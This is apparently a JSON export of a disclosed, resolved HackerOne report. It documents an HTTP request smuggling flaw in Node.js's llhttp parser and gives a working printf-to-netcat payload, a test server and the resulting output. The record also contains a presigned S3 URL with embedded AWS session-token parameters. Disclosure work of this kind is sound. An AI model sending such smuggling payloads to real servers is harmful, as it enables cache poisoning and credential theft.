@@ -1,0 +1,128 @@
+{
+  "id": 1665156,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjY1MTU2",
+  "url": "https://hackerone.com/reports/1665156",
+  "title": "HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding (improper fix for CVE-2022-32215)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-10T08:50:02.961Z",
+  "submitted_at": "2022-08-10T08:50:03.133Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "shacharm",
+    "url": "/shacharm",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-32215"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-10-26T08:17:40.051Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-09-26T08:17:33.877Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nDue to an incomplete fix for CVE-2022-32215, the `llhttp` parser in the `http` module in Node v16.16.0 and 18.7.0  still does not correctly handle multi-line Transfer-Encoding headers. This can lead to HTTP Request Smuggling (HRS).\n\n**Description:** [add more details about this vulnerability]\n\nWe have identified that the root issue of CVE-2022-32215 (that was [reported here](https://hackerone.com/reports/1501679)) was seemingly not fixed at all. Running the same exploit produces the same unwanted result. For the sake of brevity, I won't repeat the description, it can be seen in the [original issue](https://hackerone.com/reports/1501679). \n\n## Steps To Reproduce:\n\nThe reproduction steps are the same from the original issue\n\n#### Testing Server\n\nRun the following server (`node server.js`):\n```js\nconst http = require('http');\n\nhttp.createServer((request, response) => {\n   let body = [];\n   request.on('error', (err) => {\n   response.end(\"error while reading body: \" + err)\n   }).on('data', (chunk) => {\n      body.push(chunk);\n   }).on('end', () => {\n   body = Buffer.concat(body).toString();\n   \n   response.on('error', (err) => {\n      response.end(\"error while sending response: \" + err)\n   });\n\n   response.end(JSON.stringify({\n         \"Headers\": request.headers,\n         \"Length\": body.length,\n         \"Body\": body,\n      }) + \"\\n\");\n   });\n}).listen(80);\n```\n\n#### Payload\n\n```\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: 127.0.0.1\\r\\n\"\\\n\"Transfer-Encoding: chunked\\r\\n\"\\\n\" , chunked-false\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\"\\\n\"GET /flag HTTP/1.1\\r\\n\"\\\n\"Host: 127.0.0.1\\r\\n\"\\\n\"foo: x\\r\\n\"\\\n\"\\r\\n\"\\\n\"\\r\\n\" | nc localhost 80\n```\n\n#### Output\n\n```\nHTTP/1.1 200 OK\nDate: Sun, 06 Mar 2022 03:34:05 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 101\n\n{\"Headers\":{\"transfer-encoding\":\"chunked , chunked-false\"},\"Length\":1,\"Body\":\"A\"}\nHTTP/1.1 200 OK\nDate: Sun, 06 Mar 2022 03:34:05 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 64\n\n{\"Headers\":{\"host\":\"127.0.0.1\", \"foo\":\"x\"},\"Length\":0,\"Body\":\"\"}\n```\n\nAs you can see, the payload was parsed as two requests (POST to / , and GET to /flag) which is erroneous behavior (the first request was parsed as a chunked request, which is wrong)\n\nThe expected output should be -\n```\nHTTP/1.1 400 Bad Request\nConnection: close\n```\n\n## Supporting Material/References:\n\nExploitation of the issue on Node 16.16.0 -\n{F1861233}\n\n## Credit\n\nThe vulnerability was discovered by Liav Gutman of the JFrog CSO Team\n\n## Impact\n\nDepending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1861233,
+      "file_name": "CVE-2022-32215_Node16.16.0.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pkb9kqzqo0oytv1kty5mjck8ymkm?response-content-disposition=attachment%3B%20filename%3D%22CVE-2022-32215_Node16.16.0.mov%22%3B%20filename%2A%3DUTF-8%27%27CVE-2022-32215_Node16.16.0.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3AVXWWVJ%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T222218Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJHMEUCIQDfgy%2F8qvBwVwQeVtAraQuZJJXh7f%2BpoofWWWSYfCiMagIgfWxBN9ZRuZaArCBtPxzNhyUwZ7pDg6BBv0oryhrslH4quwUI9f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNdRNHCW%2B8SMnIzDlCqPBeWv77%2FKW%2FeSBC8ys57GgxwPt%2BPN54Bnxo77RyoRnrXtcwWa94u%2FhPCzPEURQnlmuxQVUwE7SbPWKVvFaV14JnfamLt8tiLXvJI0FhOIHg75dBhW26aSzygYdUnSMNGRocT7VgPMJRu2%2BetFYQDxSgIIcUWn85QprS7HW83bAaMpgJ9B9hJrj1YXBja1RCNQCywBVcMWmxidrXDvuE1f8Phr2kFVnq5etEMxDTPvgz%2FmIynJhksw6F0zkS%2FYVGIvPIKUb4UeEreKuzi2jK222bc5MdRUj%2BqkkJEveZ1uM8Exxegc9eBMg3PyOkPS91%2BX8o01b2yteFMSaWpOJ4pxD0SBiMfT%2B6fcvIOghYVXzZqilZTsehJ%2BGtfqpWYG3%2BqStOgeIkxo0cIUVjkfGnG3z1wfK2sfT6WCsbUDvhe21T15vWTSUDBiXLIZOLhj5XH%2BLstpbC7qdbLPmPJVWtA1funwW6h7%2B85cdo65sQuxWAK2x%2FODo3IdjHYuV2vEv8yfUC05iItqxuQ3WaQW6%2Fr4mTrSQMQm4aCSXO12IuuaL4U0tBi7KhaJt%2FgiDnJB17Av0mc%2BG3a2kff3tdp4SGx3OpeAPV77Xcu%2FbTzCWULR4scHJSzcTtTjLHrXGt5PAQezd9VSwKbm%2FAkUZdHnyxg7OsaBH1dn0rkWkiPlfoB0Oe%2FG3DpUvCcZSGqNC%2BYztrJrbYdX%2FMreBNnwUGK5UY9Y0YbZkuvg%2Bd9wl2b%2B4eD52%2BkFocfM5fyF%2FJ9n0xMrOtSt8so2S0w7yfj2faIu6uBhChJYzuRRMmmqMHLFlElCZHLOsDG6dvphFT2wXIwMmGiu3Jt2HBYUYdaXs2qGF2Yxlh8YSy0hX%2BNbMwZ2u5TZjdww4Za8xgY6sQGDm3y7UmSXR4Rgykodp%2FU4h%2FscUPx%2FMaOermviZqP1IRm%2BtCtDQX7txkOrjEtfU3hWgqIy2OZ%2BJ60a1fvXiH2q6StnkYBXHwlXk56zWOTx4MhJclHBSND0vGeGDIsgd0JlzG%2BHDOW9NWIe%2FNRu1P9gl68bTczwGtecIU1miL0%2Bo6x31p%2BuzNmV1yO5S4BA4i9tcbgg3e1oe4Ketr%2ByLmSna7sZQK%2BRsGlqjij0%2FrEMP%2FY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c3dfa2b36a1d2f3b15b659f27f0665f0ed9d4186e805876c4b9a8dfbc138cb63",
+      "file_size": 3106628,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-10-26T08:17:33.980Z",
+  "allow_singular_disclosure_after": -91634684.54163887,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "shreyaschavhan",
+    "7odamoo",
+    "shivammusic",
+    "blackflyhunter",
+    "garbonoti",
+    "zyklonb"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
